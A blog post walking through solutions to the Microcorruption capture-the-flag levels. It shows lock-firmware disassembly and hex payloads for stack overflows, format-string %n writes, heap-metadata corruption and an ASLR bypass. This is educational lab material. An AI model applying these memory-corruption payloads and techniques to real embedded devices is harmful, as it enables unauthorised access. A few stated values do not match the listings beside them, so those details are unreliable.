---
title: "Solving Microcorruption"
layout: post
---

My growing interest towards low-level programming led me to a CTF game called [Microcorruption](https://microcorruption.com/). The goal there is to do a series of challenges related to hacking embedded systems. There is some dissasembly of a digital lock firmware that you should analyze and exploit to find a way for opening the door. Each level progressively increases in complexity. I feel that the difficulty progression was great and in general it's a good tool to learn basic binary exploitation vulnerabilities.

Most of the vulernabilities explored there are related to stack overflows, format string attacks, heap overflows. If you consider modern OS, most of these are considered outdated and are not as common as they used to be. However, if we embark in a world of embedded systems, these are still very relevant. In this post, I will provide my solutions and notes for different levels of Microcorruption. 



<!--more-->


## Prerequisites
Before starting Microcorruption, I would recommend to have some basic knowledge of assembly language and binary exploitation. If you want to get a good ghasp on assemby, there is a great book called "RE for beginners" by Dennis Yurichev. If you want to understand how binary exploitation works, I highly recommend reading "Hacking - The Art of Exploitation" by Jon Erickson.

## Importnant notes

* Do not be confined to the main debugger screen. You can use the disassembler to look at the code and the memory viewer to look at the memory. This is very useful for understanding the code and the memory layout. Understanding that there is no boundary between the code and the data is crucial.
* RTFM. The site includes manuals for the LockItUp 1.0 and the MSP430. You should read them to understand the instructions and the memory layout. It's not necessary to read them back to back, but if you feel stuck try to uncover any new ways to get around security by reading them.
* Do not bash your head against the wall. If you feel stuck, take a break and try an alternative approach. Some levels switch from one exploitation technique to another, so it's important to be flexible and not to be confined to one approach.

## Hanoi
This level is mostly about stepping through the code. The input password prompt mentions that the password should be between 8 to 16 characters in length. After quickly observing the code, I noticed that there are two interesting functions: `test_password_valid` and `login`.

```
4454 <test_password_valid>
4454:  0412           push	r4
4456:  0441           mov	sp, r4
4458:  2453           incd	r4
445a:  2183           decd	sp
445c:  c443 fcff      mov.b	#0x0, -0x4(r4)
4460:  3e40 fcff      mov	#0xfffc, r14
4464:  0e54           add	r4, r14
4466:  0e12           push	r14
4468:  0f12           push	r15
446a:  3012 7d00      push	#0x7d
446e:  b012 7a45      call	#0x457a <INT>
4472:  5f44 fcff      mov.b	-0x4(r4), r15
4476:  8f11           sxt	r15
4478:  3152           add	#0x8, sp
447a:  3441           pop	r4
447c:  3041           ret

4520 <login>
4520:  c243 1024      mov.b	#0x0, &0x2410
4524:  3f40 7e44      mov	#0x447e "Enter the password to continue.", r15
4528:  b012 de45      call	#0x45de <puts>
452c:  3f40 9e44      mov	#0x449e "Remember: passwords are between 8 and 16 characters.", r15
4530:  b012 de45      call	#0x45de <puts>
4534:  3e40 1c00      mov	#0x1c, r14
4538:  3f40 0024      mov	#0x2400, r15
453c:  b012 ce45      call	#0x45ce <getsn>
4540:  3f40 0024      mov	#0x2400, r15
4544:  b012 5444      call	#0x4454 <test_password_valid>
4548:  0f93           tst	r15
454a:  0324           jz	$+0x8 <login+0x32>
454c:  f240 4d00 1024 mov.b	#0x4d, &0x2410
4552:  3f40 d344      mov	#0x44d3 "Testing if password is valid.", r15
4556:  b012 de45      call	#0x45de <puts>
455a:  f290 6500 1024 cmp.b	#0x65, &0x2410
4560:  0720           jnz	$+0x10 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
4566:  b012 de45      call	#0x45de <puts>
456a:  b012 4844      call	#0x4448 <unlock_door>
456e:  3041           ret
4570:  3f40 0145      mov	#0x4501 "That password is not correct.", r15
4574:  b012 de45      call	#0x45de <puts>
4578:  3041           ret
```

After stepping through `test_password_valid`, it was not obvious what it does. So, let's proceed level by level first, and see if `login` has any low hanging fruits. If we step through `login`, we will notice, that after we have entered a test valid password, we will continue till `cmp.b	#0x42, &0x2410`, and after that immediately there is an access granted jump gate! If we examine address `&0x2410` in the memory dump, it will become clear that upper address stores our password:

```
2400: 4d59 5041 5353 574f 5244 0000 0000 0000   MYPASSWORD......
2410: 0000 0000 0000 0000 0000 0000 0000 0000   ................
```

So, let's just try to overflow the input buffer with 17 characters. Then, our 17th byte will be stored exactly at address `0x2410`. When adding correct ASCII code character to the password of length 17, the lock opens.

## Cusco
Here, the code seems to be working flawlessly. However, we can notice that entered password is stored directly on the stack. If we recall that function return address is stored on the stack as well, we may want to try to overwrite it with some value that will change the control flow of the program so that our `main` function will actually return to some other address than originally intended.

If we will place breakpoint at the `ret` instruction in the `main` function and experiment with password length, we can observe that setting password to 17 characters overwrites location where `sp` points at. And, as we know, when function returns, the CPU gets the return address from the top of the stack. That's where `sp` points at! So, if we will take last 4 bytes of our 17-char password and modify them to be any address of our program, the `ret` instruction will jump there. So, we can just look at the address of `call	#0x4446 <unlock_door>` and solve this challenge. Just do not forget to reverse the byte order in your payload since the processor architecture is little endian.

## Reykjavik
Something wired is happening here. If we will go through the code listing, we won't find any usual password prompting code. However, there is a mysterious `enc` function that does something interesting. `xor` is involved, so this is likely some encoding function. If we will step through the code, we will jump to some memory location after calling `enc`. We see that there is this `call	#0x2400` instruction after our `enc` call.  To understand what happens next, we have to switch our mindset a bit. In assembly, code is data and data is code. We have just jumped to some arbitrary memory location outside of our usual code segment. But for processor, it does not matter from where to execute the instructions. So, we know where this encoded function starts, but how to find where it ends so that we can study it. Since this is a function, we can just look up an opcode for `ret`, which is `3041`. We can copy all bytes of this function and go to the Disassembler screen. Let's paste them there and hit the disassemble button. Eurika! We get the function code. Let's understand what it does:

```
; prepare stack frame
0b12           push	r11
0412           push	r4
0441           mov	sp, r4
; local variables
2452           add	#0x4, r4
3150 e0ff      add	#0xffe0, sp
3b40 2045      mov	#0x4520, r11 ; interesting, what's here? it's the address of "what's the password?" string
073c           jmp	$+0x10
1b53           inc	r11
8f11           sxt	r15
0f12           push	r15
0312           push	#0x0
b012 6424      call	#0x2464 ; this is likely a call for puts
2152           add	#0x4, sp
6f4b           mov.b	@r11, r15
4f93           tst.b	r15
f623           jnz	$-0x12
3012 0a00      push	#0xa
0312           push	#0x0
b012 6424      call	#0x2464 ; this is some another mysterious address, let's check it out. The code is below. Its an interrupt call
2152           add	#0x4, sp
3012 1f00      push	#0x1f
3f40 dcff      mov	#0xffdc, r15
0f54           add	r4, r15
0f12           push	r15
2312           push	#0x2
b012 6424      call	#0x2464 ; calling this guy again
3150 0600      add	#0x6, sp
b490 83ad dcff cmp	#0xad83, -0x24(r4)
0520           jnz	$+0xc
3012 7f00      push	#0x7f
b012 6424      call	#0x2464 ; and again! UNLOCK call here
2153           incd	sp
3150 2000      add	#0x20, sp
3441           pop	r4
3b41           pop	r11
3041           ret

; 0x2464 function - this looks exacly as our INT function from earlier, so we are calling an interrupt here!
1e41 0200      mov	0x2(sp), r14
0212           push	sr
0f4e           mov	r14, r15
8f10           swpb	r15
024f           mov	r15, sr
32d0 0080      bis	#0x8000, sr
b012 1000      call	#0x10
3241           pop	sr
3041           ret
```

From previous challenge we know, that this interrupt sequence unlocks the door

```
4446:  3012 7f00      push	#0x7f
444a:  b012 4245      call	#0x4542 <INT>
```

We have this interrupt callout in our encoded function. From the looks of it, the code is exactly the same as it was previously, but it's not stored in the code segment of the binary now. So, my guess is that the previous overflow bug should still work, but the return address will now be different. Let's find the correct return address and try to overflow the stack yet again. The opcode for our unlock interrupt is `b012 6424`. Now, let's locate it in the memory dump and record the address. It is `0x2458`.

* Address where our string starts: `0x43dc`
* Address where encoded function returns: `0x4400`
* Payload length should be 36 symbols

After checking the stack overflow path it became clear that we can't overflow the stack this time to the point that we will overwrite the return address of this encoded function.
Let's look at the function source again:
```
b490 83ad dcff cmp	#0xad83, -0x24(r4)
0520           jnz	$+0xc
3012 7f00      push	#0x7f
b012 6424      call	#0x2464 ; and again! UNLOCK call here
```

Probably, this `cmp` is the key. If we will try try out entering password `83ad` in hex to account for little endianness we will unlock the door!

## Whitehorse

There's a quick find in the spirit of previous challenges that we can utilize right away. Overflow prompt that allows us to jump to any address on `main` return:

```
1234567890AAAAAAAAAAAAAAAAAAAAAABBBB
```

I was wondering what to do after I've fond an overflow for quite a while. There is no clear place in the code that we can jump to to get around security. As it turns out, the key to this challenge is to read the manual. After inspecting the manual that you can find on the microcorruption site, we shall see that there is an interrupt `0x7f` that can unlock the door. Since we have an overflow payload now, we can embed assembly to execute the 0x7F interrupt in there using disassembler tool provided on the site. We can create this bytecode:

```
3012 7f00      push	#0x7f
b012 3245      call	#0x4532 <INT>
```

Now, we need to capture the return address to be some part of our prompt where we will inject the bytecode for interrupt call. The address where our prompt will start is at `0x3bf4`

```
3be0: 0000 4645 0100 4645 0300 ba45 0000 0a00   ..FE..FE...E....
3bf0: 0000 2a45 1234 5678 90aa aaaa aaaa aaaa   ..*E.4Vx........
3c00: aaaa aaaa 5844 aaaa aaaa aaaa aaaa aaaa   ....XD..........
3c10: aaaa aaaa aa00 0000 0000 0000 0000 0000   ................
3c20: 0000 0000 0000 0000 0000 0000 0000 0000   ................
```

Let's create our payload. We can just insert instructions at the start of the prompt and put the return address in little endian format to where `sp` is pointing at. The payload will look like this:

```
30127f00b0123245AAAAAAAAAAAAAAAAf43b
```

Here is a dissection of this payload:

```
    ┌──────────────────────────────────────────────┐
    │                                              │
    │                                              │
    │ ┌────────────────────────────────────────┐   │
    │ │                                        │   │
    ▼ ▼                                        │   │
  0x3b34: 3012 7f00 b012 3245 AAAAAAAAAAAAAAAA f4 3b
          ───────── ───────── ──────────────── ── ──
          push      call      padding          stack
          0x7f      <INT>                      pointer
```

## Montevideo
This time, the input string is copied from one portion of the memory to another. The issue is that we still can overflow the stack to get to the return address. sp on `login` return points to `0x43f0`, and with long enough prompt we can still set it:

```
43f0: aaaa aaaa aaaa aaaa aaaa aaaa aaaa [aaaa] <- sp points here   ................
4400: aaaa aaaa aaaa aaaa aaaa aaaa 005a  3f40                     .............Z?@
```

So, let's try out our unlock interrupt payload:

```
30127f00b0123245AAAAAAAAAAAAAAAAAAf043
```

When we do this, we observe that the whole string is not being copied to the destination memory. What's wrong there?

```
4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy> <- HERE!
451e:  3d40 6400      mov	#0x64, r13
4522:  0e43           clr	r14
4524:  3f40 0024      mov	#0x2400, r15
4528:  b012 f045      call	#0x45f0 <memset>
```

The problem is that our payload includes the `00` byte which `strcpy` interprets as the end of the string, so it stops there. To get around this, we can modify our payload to hide the `00` byte. Thankfully, the only `00` that we have is in our interrupt code: `7f00`. So, we can just hide it by using some maths, like `7f11-0011 = 7f00`. No null byte in the code 🏴‍☠️. Let's modify our payload. We will use `r15` as a temporary register for computing the interrupt code

```
mov #0x7f11,r15
add #-0x11,r15
push r15
call	#0x454c
```

The above code assembles into

```
3f40117f3f50efff0f12b0124c45AAAAee43
```

After trying this I had some troubles due to `sr` redister which turns off the CPU before the interrupt gets called. So, why mess with assembly payload at all, when we can just overwrite the first argument of `INT` to be `0x7f` by putting it on the stack? It reads the interrupt code from the stack right at the start of the function anyways. Let's try this payload:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4c45bbbb7f00
```

And yes, this is indeed a much simpler solution. The door unlocks.

## Johannesburg
Observation: we can overwrite first few functions using prompt, stack still overflows. There is a password length check that avoids calling `ret` in an attempt to prevent the stack overflow.

```
4578:  f190 4600 1100 cmp.b	#0x46, 0x11(sp)
457e:  0624           jz	$+0xe <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__> ; if the password is too long, we wont reach ret
```

The password length check just checks one byte at some memory location:

```
cmp.b	#0x46, 0x11(sp)
```

We can easily set this byte to 0x46 and bypass the check:

```
424242424242424242424242424242424246
```

Done 💀. Now we can overflow the return address.
Let's use our `0x7f` payload from before. The `INT` address is `0x4594` this time:

```
424242424242424242424242424242424246944543437f00
```

The lock opens!

## Santa Cruz
Wow, lot's of code. Asks us to ender password and username. Obesrvation: there is a length checking loop.

```
45d0:  0f4b           mov	r11, r15
45d2:  0e44           mov	r4, r14
45d4:  3e50 e8ff      add	#0xffe8, r14 o ; -24
45d8:  1e53           inc	r14 ; we are incrementing counter
45da:  ce93 0000      tst.b	0x0(r14) ; and testing if we've met a null byte here
45de:  fc23           jnz	$-0x6 <login+0x88>
45e0:  0b4e           mov	r14, r11
45e2:  0b8f           sub	r15, r11
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15; -0x18(r4) stores 16 (dec)
45e8:  8f11           sxt	r15
45ea:  0b9f           cmp	r15, r11 ; comparing length here
```

```
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15
```

This is local var for minimum password length located at abs address 0x43b4. There is similar check that checks previous byte for minimum length:

```
45fa:  5f44 e7ff      mov.b	-0x19(r4), r15
```

We can craft a username payload to overwrite this

```
414141414141414141414141414141414108101041414141414141414141414141414141414141413a46
414141414141414141414141414141414108101042424242424242424242424242424242424242423a46
4141414141414141414141414141414141081010
```

The return address of SP in `login` function is at 0x43c0. 

There are two instructions that make some comparison at the end of the function

```
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	$+0xe <login+0x10e>
```

We place this 00 in memory right at the start of the function

```
455c:  c443 faff      mov.b	#0x0, -0x6(r4)
```

We need this test to pass. Adding zeroes before our address won't work due to strcpy. There is one new door that has opened for us. Since we now control length checks, we can overflow the password too!
We can choose the password length that we need, then set 00 at the correct address to bypass the last check.
After a lot of trial and error, I came with the correct username and password:

```
4141414141414141414141414141414141084040424242424242424242424242424242424242424242423a46
4343434343434343434343434343434343
```

## Jakarta

When we enter password, `getsn` call writes it to the same memory location as our previous username.

There might be a bug in terms of how we compute the username length:

```
4596:  1f53           inc	r15
4598:  cf93 0000      tst.b	0x0(r15)
459c:  fc23           jnz	$-0x6 <login+0x36>
459e:  0b4f           mov	r15, r11 ; r11 now contains address of the end of the string
45a0:  3b80 0224      sub	#0x2402, r11 ; r11 now contains the length of the string
45a4:  3e40 0224      mov	#0x2402, r14 ; r14 now contains the start of the string
45a8:  0f41           mov	sp, r15
45aa:  b012 f446      call	#0x46f4 <strcpy> ; here, we copy all of it to memory. The limit is 512 bytes according to first getsn limit
45ae:  7b90 2100      cmp.b	#0x21, r11 ; check the length of the string against 33
45b2:  0628           jnc	$+0xe <login+0x60>
```

Here, we do sub to compute the actual length, and r15 contains our location of the 00 byte in the username. We can easily trick the check by including 00 byte at the start of the username, but then strcpy will skip copying the whole string. The second getsn call copies max 32 chars into memory, but what about subsequent strcpy call? It will copy everything up to 00 byte again, which will be a part of our password string no matter what.

```
;r11 contains username length
45c8:  3e40 1f00      mov	#0x1f, r14
45cc:  0e8b           sub	r11, r14
; now, r14 contains 31 - r11 = remaining chars up to 32 symbols of username + password

; keeps the last 9 bits of the value and zeroes the rest of them
and	#0x1ff, r14 
; address where to copy the password
mov	#0x2402, r15
; get the password
call	#0x46b8 <getsn>
```

After lots of trials an errors and finally giving up and browsing the internet I've found that there is a mistake here:

```
45c8:  3e40 1f00      mov	#0x1f, r14
45cc:  0e8b           sub	r11, r14 ; 31 dec - your username length.
45ce:  3ef0 ff01      and	#0x1ff, r14
45d2:  3f40 0224      mov	#0x2402, r15
45d6:  b012 b846      call	#0x46b8 <getsn>
```

0x1f is 31 in decimal, but we can enter a password longer than that. And this will cause an overflow in r14. Since this controls how many chars we will get for a password afterwards, we can try to overflow the password field now!
Let's try a username of length 32, and some really long password:

```
4242424242424242424242424242424242424242424242424242424242424242
```

Yes, we can now trick `strcpy` into copying all of this beauty onto the stack! But what about the length checks?

```
45fa:  3f80 0224      sub	#0x2402, r15
45fe:  0f5b           add	r11, r15
4600:  7f90 2100      cmp.b	#0x21, r15 ; compare that lower bytes are less than 0x21
4604:  0628           jnc	$+0xe <login+0xb2>
```

This check compares only lower bytes, not upper bytes. So... what about password of length 0x0100? Then, we will add to r11, which will be `0x20`, and our check should pass.
If we will examine the return address, we will find out that our `sp` is at `0x4` offset from our password string. And the unlock interrupt address is at `461c`. Now, it's down to some simple math to overflow the return address. 

Let's whisper our incantations now, and unlock the door:

```
# username
python -c 'print("42"*32)' | pbcopy  

# password
python -c 'print("424242421c46" + "42" * (0x100 - 0x6))' | pbcopy 
```

## Addis Ababa
Since `printf` is used here, it's possibly vulernable to https://owasp.org/www-community/attacks/Format_string_attack.

Useful readup on why they work: https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf

```
4476:  814f 0000      mov	r15, 0x0(sp)
447a:  0b12           push	r11
447c:  b012 c845      call	#0x45c8 <printf>
```
Looks like format string is not being used here! It's interesting how we test for unlock here:
```
4472:  b012 b044      call	#0x44b0 <test_password_valid>
4476:  814f 0000      mov	r15, 0x0(sp)
...
448a:  8193 0000      tst	0x0(sp)
448e:  0324           jz	$+0x8 <main+0x5e>
4490:  b012 da44      call	#0x44da <unlock_door>
```

So, if we could put 0 at the top of the stack, we will trigger the unlock.
We copy only first 19 characters:

```
4454:  3e40 1300      mov	#0x13, r14 ; 0x13 == 19
4458:  3f40 0024      mov	#0x2400, r15
445c:  b012 8c45      call	#0x458c <getsn>
```

The `%n` format specifier can be used to write to memory. It writes the number of characters successfully written so far to the integer pointed to by its corresponding argument. If an attacker can control the format string, they can use `%n` to write arbitrary values to arbitrary locations.

> n The argumentis is of type unsigned int*. Saves the number of characters printed thus far. No output is produced.  

Indeed, if we use something like this, we will crash the program

```
aaaa%n%n:aaaa%n%n%n
```

I noticed that the program jumps to address 6161, which is `aa` in char. If I will take the call address of unlock 0x4490 and add it to the first letters of our password

```
python -c 'print("9044" + "".join(format(ord(c), "02x") for c in "a%n%n:bbb"))' 
```

However, now address 0x4490 got overwritten with something
Ok, looks like we can overwrite memory at the location of the first two chars with the total number of chars written. This can be used to modify some instruction to bypass the correctness check.

```
447c:  b012 c845      call	#0x45c8 <printf>
4480:  2153           incd	sp
4482:  3f40 0a00      mov	#0xa, r15
4486:  b012 5045      call	#0x4550 <putchar>
448a:  8193 0000      tst	0x0(sp) ; this checks the return value from test password function
448e:  0324           jz	$+0x8 <main+0x5e>
4490:  b012 da44      call	#0x44da <unlock_door>
```

Luckily, we can easily override the top of the stack with some non-zero number to bypass the `tst` and subsequent `jz`. Let's locate the address of the top of the stack and create our payload:

```
python -c 'print("a630" + "".join(format(ord(c), "02x") for c in "a%n%n:bbb"))' 
```

## Novosibirsk

There is clearly another printf vulernability here. And now we can copy up to 512 characters from the input
Also, this time we are calling an interrupt that checks password validity internally

```
; conditional_unlock_door
...
44c2:  0e12           push	r14
44c4:  0f12           push	r15
44c6:  3012 7e00      push	#0x7e
44ca:  b012 3645      call	#0x4536 <INT>
```

However, since we can use a lot of chars, why not to try to override the interrupt number that we are executing?

```
44c6:  3012 7e00      push	#0x7e
```

Let's change this to `0x7f` to unconditionally open the door. It will amount to 127 in dec, so we can use `%n` vulernability again to modify the opcode of the `push` instruction and change the interrupt code
We can use this code to generate the payload:

```
python -c 'print("c844" + "42"*125 + "".join(format(ord(c), "02x") for c in "%n%n"))' | pbcopy
```

Breakdown
- `c844` is the address of where the interrupt code is located in memory in little endian format
- `"42"*125` is 125 symbols in a row, can be any symbol
- Then, we use `%n%n` to write the number `2 + 125 = 127` to the memory location that we indicate at the start of the string, which is `448c`

## Algiers
This challenge is a bit different. It's related to heap corruption attachs, which are a new type for us. 

Here are some good related materials:
* Understanding heap layout: https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/
* A good writeup on it, could not solve it myself: https://medium.com/@sigkilla9/algiers-heap-exploitation-microcorruption-com-61008079bd0d
* We have two malloc calls here, probably for username and password. malloc is also susceptible to overflow attacks: https://neerajsnawale.medium.com/exploit-more-memory-than-allocated-with-malloc-why-c30cb1ba36b5

The approach to tackle Algiers is that you should take advantage of overflowing the malloc buffer structure. You can enter long password and overwrite chunk's metadata. If you will reverse what `free` does carefully, you will notice that the key is on this line:

```
452a:  8e4c 0400      mov	r12, 0x4(r14)
```

We are moving some data we have control of to some memory address that we have control of. Meaning, that if we put a  correct number in `r14`, we can write to the top of the stack. In other words, we can overwrite the return address of the `free` function. By carefully examining which mathematical operations happen to registers inside `free` function we can calculate what value to put in there so that at the end of the function we will write address of an `unlock` call. The resulting payload is

```
4242424242424242424242424242424290434024dcff414141
```


## Vladivostok
This challenge presents an ASLR. ASLR is a security feature that randomizes the memory address where system executables are loaded into memory. This makes it harder for attackers to predict the location of code in memory. This makes debugging and understanding what is happening in the code a lot harder. However, we can still notice that `sp` can be overflowed by providing long inputs. The question now is where should we return to?

```
414141414141414141414242
; where 4242 will be our SP address
```

So, we can find out to which address we should return to. This is complicated, since ASLR randomizes code segment address. However, if you read through the `main` the function itself, it will be clear that the code bytes are just copied over to some other random location in memory. That means, that all relative addresses should stay the same. We should just calculate an offset for something that calls an interrupt. And then we can use the door unlock interrupt address that we will put on stack.

If we will use `%x%x%x%x` as a username, we will see top of the stack printed. Since it's a print, we can judge that this is the addreess of a `printf` call.

```
476a <printf> ; in the original code
; base address of the original code is 0x4400
; we can try returning to
48ec <_INT>

0x48ec -  0x476a = 0x19a
```

Now, at the start of the program we can print or `printf` address, calculate `INT` address using the offset. Our winning payload is

```
4141414141414141 [%x%x output + 0x19a] 4141 7f00
```

# Conclusion

Microcorruption is a very challenging and fun way to learn about embedded systems security. It's a great way to learn about assembly, stack overflows, memory corruption bugs and even some advanced concepts like ASLR.

While many types of these bugs are not very relevant in software world due to modern security features, they are still relevant and quite easy to make in the embedded world, where can find yourself writing code for bare metal without any OS support.